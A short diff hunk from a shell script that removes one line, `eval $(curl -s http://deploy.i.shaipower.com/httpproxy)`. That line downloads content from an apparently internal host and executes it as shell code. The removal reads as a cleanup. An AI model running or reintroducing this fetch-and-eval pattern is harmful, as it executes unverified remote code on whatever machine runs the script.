@@ -9,8 +9,6 @@
 # flow continues unchanged.
 ################################################################################
 
-eval $(curl -s http://deploy.i.shaipower.com/httpproxy)
-
 # Directory of this script (absolute path)
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 
